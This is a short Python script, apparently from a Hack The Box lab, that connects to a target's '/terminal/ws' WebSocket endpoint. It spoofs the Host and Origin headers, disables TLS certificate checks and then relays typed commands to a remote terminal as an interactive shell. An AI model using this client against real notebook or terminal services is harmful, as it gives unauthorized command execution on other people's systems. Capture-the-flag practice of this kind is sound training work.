import ssl
import threading
import websocket

host = "nb-1be3782a8afd3ad5.cohort.htb"
ws_url = "wss://<TargetIP>/terminal/ws"

# Global WebSocket object
ws = None

def recv_loop():
    """Continuously receive messages from the server and print them."""
    global ws
    while True:
        try:
            data = ws.recv()
            print(data, end="")
        except Exception:
            print("\n[!] Connection closed")
            break

def main():
    global ws
    ws = websocket.create_connection(
        ws_url,
        host=host,
        origin="https://" + host,
        sslopt={"cert_reqs": ssl.CERT_NONE},
        timeout=5,
    )

    print("[+] WebSocket connected. Type 'exit' to quit.")

    # Start the background thread to receive server output
    threading.Thread(target=recv_loop, daemon=True).start()

    # Main interactive input loop
    while True:
        cmd = input()
        if cmd.lower() == "exit":
            break

        # Most terminal WebSockets expect a carriage return or newline.
        # Adjust to \n or \r\n if needed.
        ws.send(cmd + "\r")

    ws.close()

if __name__ == "__main__":
    main()
